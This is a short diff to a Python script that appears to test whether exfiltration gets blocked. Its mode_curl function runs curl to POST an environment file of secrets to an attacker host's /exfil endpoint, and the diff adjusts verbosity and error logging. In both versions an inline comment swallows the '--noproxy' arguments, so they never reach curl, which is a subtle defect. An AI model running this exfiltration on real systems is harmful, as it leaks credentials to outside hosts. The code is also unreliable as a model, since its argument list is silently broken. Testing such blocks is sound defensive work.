@@ -110,7 +110,7 @@ def mode_curl(_secret, args):
     log(f"exfil: curl subprocess to {args.attacker}:{args.port} "
         f"(my child must inherit my tag)")
     p = subprocess.run(
-        [curl, "-sS", "-m", "5",   # -S: keep error text, so a block is visible "--noproxy", "*",
+        [curl, "-sSv", "-m", "5",   # -v: curl 8 only names the errno in its verbose connect line "--noproxy", "*",
          "--data-binary", "@" + args.env,
          f"http://{args.attacker}:{args.port}/exfil"],
         capture_output=True, text=True, timeout=15)
@@ -126,7 +126,7 @@ def mode_curl(_secret, args):
             f"— is the attacker really listening at {args.attacker}:{args.port}?")
     else:
         log(f"curl failed with exit code {p.returncode} "
-            f"(stderr: {p.stderr.strip()[:100]})")
+            f"({p.stderr.strip().splitlines()[-1][:100] if p.stderr.strip() else 'no stderr'})")
 
 
 def mode_udp(secret, args):
